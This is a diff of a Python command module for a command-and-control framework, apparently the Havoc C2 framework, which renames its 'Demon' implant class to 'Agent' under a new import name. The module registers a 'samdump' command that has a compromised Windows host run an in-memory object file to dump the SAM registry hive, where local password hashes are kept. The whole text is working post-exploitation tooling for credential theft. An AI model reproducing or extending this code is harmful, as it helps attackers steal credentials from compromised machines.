@@ -1,4 +1,4 @@
-from havoc import Demon, RegisterCommand
+from vaelix_host import Agent, RegisterCommand
 import re
 import time
 
@@ -7,27 +7,27 @@ import time
 def is_full_path(path):
     return re.match(r'^[a-zA-Z]:\\', path) is not None
 
-def samdump(demonID, *params):
+def samdump(agentID, *params):
     TaskID : str    = None
-    demon  : Demon  = None
+    agent  : Agent  = None
     packer = Packer()
 
     num_params = len(params)
     path = ''
 
-    demon = Demon( demonID )
+    agent = Agent( agentID )
 
     if num_params != 1:
-        demon.ConsoleWrite( demon.CONSOLE_ERROR, "missing the path" )
+        agent.ConsoleWrite( agent.CONSOLE_ERROR, "missing the path" )
         return True
 
     path = params[ 0 ]
 
     packer.addstr(path)
 
-    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to dump the SAM registry" )
+    TaskID = agent.ConsoleWrite( agent.CONSOLE_TASK, f"Tasked agent to dump the SAM registry" )
 
-    demon.InlineExecute( TaskID, "go", f"regdump.{demon.ProcessArch}.o", packer.getbuffer(), False )
+    agent.InlineExecute( TaskID, "go", f"regdump.{agent.ProcessArch}.o", packer.getbuffer(), False )
 
     return TaskID
 
